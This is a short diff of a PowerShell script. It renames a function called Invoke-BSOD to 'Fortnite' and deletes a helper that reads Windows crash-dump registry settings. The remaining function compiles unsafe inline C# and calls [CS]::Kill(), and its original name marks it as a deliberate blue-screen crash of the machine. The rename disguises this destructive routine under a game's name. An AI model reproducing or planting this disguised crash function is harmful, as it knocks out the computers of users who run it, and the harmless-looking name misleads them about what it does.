@@ -1,4 +1,4 @@
-function Invoke-BSOD {
+function Fortnite {
 
 $source = @"
 using System;
@@ -23,23 +23,4 @@ public static class CS{
     $comparams.CompilerOptions = '/unsafe'
     $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
     [CS]::Kill()
-}
-
-function Get-DumpSettings {
-	$regdata = Get-ItemProperty -path HKLM:\System\CurrentControlSet\Control\CrashControl
-
-	$dumpsettings = @{}
-	$dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
-		1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
-		2 {"Kernel Memory Dump"}
-		3 {"Small Memory Dump"}
-		7 {"Automatic Memory Dump"}
-		default {"Unknown"}
-	}
-	$dumpsettings.DumpFileLocation = $regdata.DumpFile
-	[bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
-	[bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
-	[bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
-	[bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
-	$dumpsettings
 }
